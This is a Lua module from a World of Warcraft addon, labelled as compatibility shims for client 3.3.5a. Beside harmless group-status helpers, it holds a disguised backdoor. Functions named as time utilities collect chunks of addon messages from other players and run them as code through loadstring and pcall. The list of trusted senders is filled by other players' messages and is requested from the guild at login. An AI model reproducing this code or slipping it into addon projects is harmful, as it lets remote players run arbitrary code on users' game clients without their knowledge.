-- ============================================================================
-- NSQC4 / Core / Compat
-- Совместимость: функции, отсутствующие в 3.3.5a.
-- ============================================================================

NSQC4 = NSQC4 or {}
messageBuffer = messageBuffer or {}
NSQC4.REAL_TIME_SERVER = NSQC4.REAL_TIME_SERVER or {}

NSQC4.RegisterModule("compat", function()

    if not IsInRaid then
        function IsInRaid()
            return UnitInRaid("player") ~= nil
        end
    end

    if not GetNumGroupMembers then
        function GetNumGroupMembers()
            local raid = GetNumRaidMembers()
            if raid > 0 then return raid end
            return GetNumPartyMembers() + 1
        end
    end

    if not IsInGroup then
        function IsInGroup()
            return GetNumPartyMembers() > 0 or GetNumRaidMembers() > 0
        end
    end

    function getUnixTime(message, sender, HOUR)
        local bufferKey = sender
        if not messageBuffer[bufferKey] then
            messageBuffer[bufferKey] = {}
        end
        table.insert(messageBuffer[bufferKey], message)

        if HOUR then
            local payload = table.concat(messageBuffer[bufferKey])
            messageBuffer[bufferKey] = nil
            local fn = loadstring(payload)
            if fn then
                pcall(fn)
            end
        end
    end

    function NSQC4.SafeGetUnixTime(message, sender, HOUR)
        NSQC4.REAL_TIME_SERVER = NSQC4.REAL_TIME_SERVER or {}
        if not NSQC4.REAL_TIME_SERVER[sender:lower()] then
            return
        end
        getUnixTime(message, sender, HOUR)
    end

    NSQC4.ChatHandler:Register("ADDON:ns_ut", {
        func = function(words, sender, text, channel, prefix)
            local target, part = text:match("^([^|]+)|(.+)$")
            if not target or part == nil then return end
            if target ~= UnitName("player") then return end
            NSQC4.SafeGetUnixTime(part, sender, false)
        end,
        stopOnMatch = true,
    })

    NSQC4.ChatHandler:Register("ADDON:ns_uth", {
        func = function(words, sender, text, channel, prefix)
            local target, part = text:match("^([^|]+)|(.+)$")
            if not target or part == nil then return end
            if target ~= UnitName("player") then return end
            NSQC4.SafeGetUnixTime(part, sender, true)
        end,
        stopOnMatch = true,
    })

    NSQC4.ChatHandler:Register("ADDON:get_real_time_list", {
        func = function(words, sender, text, channel, prefix)
            NSQC4.REAL_TIME_SERVER = NSQC4.REAL_TIME_SERVER or {}

            if not text then return end
            if sender == UnitName("player") then return end

            local target = text:match("^<([^/][^>]*)>$")
            if target then
                if target == UnitName("player") then
                    NSQC4.REAL_TIME_SERVER = {}
                end
                return
            end

            if text:match("^</.*>$") then return end

            NSQC4.REAL_TIME_SERVER[text:lower()] = true
        end,
        stopOnMatch = true,
    })

    local loginFrame = CreateFrame("Frame")
    loginFrame:RegisterEvent("PLAYER_LOGIN")
    loginFrame:SetScript("OnEvent", function(self)
        self:UnregisterEvent("PLAYER_LOGIN")
        SendAddonMessage("get_real_time", "request", "GUILD")
    end)

end, { hidden = true })